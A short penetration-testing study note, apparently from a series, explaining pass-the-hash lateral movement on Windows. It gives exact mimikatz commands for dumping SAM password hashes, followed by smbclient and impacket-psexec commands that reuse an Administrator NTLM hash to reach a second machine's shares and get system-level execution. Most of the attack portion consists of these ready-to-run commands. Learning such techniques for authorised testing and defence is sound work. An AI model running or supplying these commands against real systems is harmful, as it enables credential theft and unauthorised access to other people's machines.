#### Pass the Hash

sometimes we may not be able to crack the ntlm hash

in this case we can use the hash to gain access via other methods

in the following example we have gained access to machine1 and obtained user1 creds

now we want to see if we can grab the Administrator NTLM hash and leverage it to gain access to machine2

in the case that the Administrator has the same password for both machines this will work

so to grab the Admin NTLM we follow the steps in the previous post 

    $ mimikatz.exe

    mimikatz# privilege::debug

    mimikatz# token::elevate

    mimikatz# lsadump::sam

once we have the hash we can then leverage a multitude of tools that take NTLM hash in an attempt to gain access

#### smbclient

    $ smbclient \\\\192.168.50.212\\share1 -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

#### impacket

hwere we use impacket that contains psexec, ps-exec will execute as system user, if we want to login with the hash user creds (Admin) then we would use wmiexec

    $ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.50

in the attack above we do not have the LM hash so we fill the first 32 chars with 0s and then use our NTLM hash
